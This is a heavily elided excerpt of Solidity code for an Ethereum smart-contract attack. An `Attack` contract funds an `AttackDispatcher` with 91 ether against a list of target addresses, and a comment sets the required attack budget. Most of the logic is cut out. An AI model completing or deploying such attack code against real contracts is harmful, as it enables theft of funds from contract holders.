 ...
 * parameter. Make sure to send at least 91 ether and 1 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                uint value = 0x4eee0f1dc808c0000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x4eee0f1dc808c0001; /* equals 91 ether and 1 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 91000000000000000000 }(0, _targets);
    }
